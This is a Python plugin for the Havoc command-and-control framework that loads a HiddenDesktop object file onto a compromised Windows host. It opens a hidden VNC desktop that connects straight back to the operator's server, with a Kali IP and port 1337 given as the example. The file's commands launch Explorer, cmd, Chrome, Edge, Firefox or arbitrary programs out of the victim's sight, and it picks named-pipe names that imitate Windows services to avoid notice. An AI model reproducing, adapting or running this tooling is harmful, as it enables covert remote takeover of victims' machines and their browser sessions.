# havoc-hiddendesktop — Havoc loader. Havoc PyRun_SimpleString has no __file__.
from havoc import Demon, RegisterCommand
import os
import random

# Override: export HAVOC_HD_BIN=/path/to/bin  or edit HD_BIN.
HD_BIN = os.environ.get("HAVOC_HD_BIN", "")
HERE = ""
for _p in (
    HD_BIN,
    os.path.expanduser("~/github/havoc-hiddendesktop/bin"),
    os.path.expanduser("~/tools/havoc-hiddendesktop/bin"),
    os.path.expanduser("~/tools/HiddenDesktop/bin"),
):
    if _p and os.path.isfile(os.path.join(_p, "HiddenDesktop.x64.o")):
        HERE = _p
        break
if not HERE:
    HERE = os.path.expanduser("~/github/havoc-hiddendesktop/bin")
_DESKTOP = {}

_PIPES = (
    "SapIServerPipes-1-5-5-0",
    "epmapper-",
    "atsvc-",
    "plugplay+",
    "srvsvc-1-5-5-0",
    "W32TIME_ALT_",
    "tapsrv_",
    "Printer_Spools_",
)


def _pipe():
    return "\\\\.\\pipe\\" + random.choice(_PIPES) + str(random.randint(1000, 9999))


def _desk():
    return "sbox_alternate_desktop_0x" + str(random.randint(1000, 9999))


def hidden_desktop(demonID, *param):
    demon = Demon(demonID)
    args = list(param)
    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: HiddenDesktop <server> <port> [desktop] [pipe]")
        return False
    server = args[0]
    try:
        port = int(args[1])
    except ValueError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "invalid port")
        return False
    desk = args[2] if len(args) > 2 else _desk()
    pipe = args[3] if len(args) > 3 else _pipe()
    pid = int(demon.ProcessID)
    if pid <= 0 or pid > 32767:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "PID %d does not fit BOF short" % pid)
        return False

    obj = os.path.join(HERE, "HiddenDesktop.%s.o" % demon.ProcessArch)
    if not os.path.isfile(obj):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing BOF %s" % obj)
        return False

    # Direct TCP to operator HVNC Server. Do not use Havoc rportfwd (not a bidirectional stream).
    TaskID = demon.ConsoleWrite(
        demon.CONSOLE_TASK,
        "HiddenDesktop desktop=%s pipe=%s pid=%d  connect %s:%d (direct)" % (desk, pipe, pid, server, port),
    )

    packer = Packer()
    packer.addshort(pid)
    packer.addstr(pipe)
    packer.addstr(desk)
    packer.addshort(port)
    packer.addstr(server)
    _DESKTOP[demonID] = desk
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def _launch(demonID, app, extra=None):
    demon = Demon(demonID)
    desk = _DESKTOP.get(demonID)
    if not desk:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "no desktop — run HiddenDesktop first")
        return False
    obj = os.path.join(HERE, "%s.%s.o" % (app, demon.ProcessArch))
    if extra is not None:
        obj = os.path.join(HERE, "generic.%s.o" % demon.ProcessArch)
    if not os.path.isfile(obj):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing BOF %s" % obj)
        return False
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "hd-launch %s on %s" % (app, desk))
    packer = Packer()
    packer.addstr(desk)
    if extra is not None:
        cmd, _, rest = extra.partition(" ")
        packer.addstr(cmd)
        packer.addstr(rest if rest else "NA")
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def hd_explorer(demonID, *param):
    return _launch(demonID, "explorer")


def hd_cmd(demonID, *param):
    return _launch(demonID, "cmd")


def hd_run(demonID, *param):
    return _launch(demonID, "run")


def hd_chrome(demonID, *param):
    return _launch(demonID, "chrome")


def hd_edge(demonID, *param):
    return _launch(demonID, "edge")


def hd_firefox(demonID, *param):
    return _launch(demonID, "firefox")


def hd_launch(demonID, *param):
    if not param:
        Demon(demonID).ConsoleWrite(Demon(demonID).CONSOLE_ERROR, "Usage: hd-launch <command> [args]")
        return False
    return _launch(demonID, "generic", extra=" ".join(param))


RegisterCommand(hidden_desktop, "", "HiddenDesktop", "HVNC hidden desktop (direct TCP to operator). Usage: HiddenDesktop <KALI_IP> 1337", 0, "<server> <port> [desktop] [pipe]", "192.168.0.111 1337")
RegisterCommand(hd_explorer, "", "hd-launch-explorer", "Explorer on hidden desktop", 0, "", "")
RegisterCommand(hd_cmd, "", "hd-launch-cmd", "cmd on hidden desktop", 0, "", "")
RegisterCommand(hd_run, "", "hd-launch-run", "Run dialog on hidden desktop", 0, "", "")
RegisterCommand(hd_chrome, "", "hd-launch-chrome", "Chrome on hidden desktop", 0, "", "")
RegisterCommand(hd_edge, "", "hd-launch-edge", "Edge on hidden desktop", 0, "", "")
RegisterCommand(hd_firefox, "", "hd-launch-firefox", "Firefox on hidden desktop (-no-remote, empty profile)", 0, "", "")
RegisterCommand(hd_launch, "", "hd-launch", "Run command on hidden desktop", 0, "<command> [args]", "notepad")
